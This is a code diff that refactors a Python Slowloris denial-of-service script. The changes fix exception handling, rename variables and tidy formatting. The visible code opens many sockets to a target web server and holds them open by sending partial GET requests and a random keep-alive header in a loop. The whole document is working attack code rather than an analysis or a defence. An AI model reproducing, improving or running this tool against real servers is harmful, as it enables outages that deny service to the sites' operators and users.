@@ -11,7 +11,6 @@ import time
 import socket
 import random
 import argparse
-import ipaddress
 
 
 #Headers to be sent at the beginning of the connection
@@ -22,28 +21,28 @@ HEADERS = [
 ]
 
 def socket_error(sock):
-    """ Handles a socket error: kill the socket. """
+    """ Handles a socket error: kills the socket. """
     print("Socket error, killing socket")
     sock.close()
     sock = None
     return sock
 
 
-def init_socket(socket_tuple):
+def init_socket(socket_t):
     """ Inits a socket and sends the first headers. It also sends the start
     of the request.
     """
-    sock = socket.socket(socket_tuple[0], socket_tuple[1], socket_tuple[2])
+    sock = socket.socket(socket_t[0], socket_t[1], socket_t[2])
     sock.settimeout(15)
-    sock.connect(socket_tuple[4])
+    sock.connect(socket_t[4])
 
     if sock:
         try:
-            sock.send(b"GET /?%d HTTP/1.1\r\n" %random.randint(0,5000))
+            sock.send(b"GET /?%d HTTP/1.1\r\n" %random.randint(0, 5000))
             for header in HEADERS:
                 sock.send(header)
-        except sock.error:
-                sock = socket_error()
+        except OSError:
+            sock = socket_error(sock)
     return sock
 
 def send_header(sock):
@@ -51,10 +50,10 @@ def send_header(sock):
     """
     if sock:
         try:
-            value = random.randint(1,5000)
+            value = random.randint(1, 5000)
             sock.send(b"X-a: %d\r\n" % value)
-        except socket.error as error:
-            print("Socket error:\n%s\n killing socket" % error)
+        except OSError as msg:
+            print("Socket error:\n%s\n killing socket" % msg)
             sock.close()
             LIST_OF_SOCKETS.remove(sock)
 
@@ -73,7 +72,7 @@ def slow_loris(socket_tuple, sock_number):
     while True:
         print("Sending keep-alive headers."
               "Remaining sockets: %d" % len(LIST_OF_SOCKETS)
-        )
+             )
         for sock in LIST_OF_SOCKETS:
             send_header(sock)
         for _ in range(sock_number - len(LIST_OF_SOCKETS)):
@@ -132,5 +131,5 @@ if __name__ == "__main__":
         default=80,
     )
     ARGS = PARSER.parse_args()
-    socket_tuple = validate_args(ARGS)
-    slow_loris(socket_tuple, ARGS.number)
+    SOCKET_TUPLE = validate_args(ARGS)
+    slow_loris(SOCKET_TUPLE, ARGS.number)
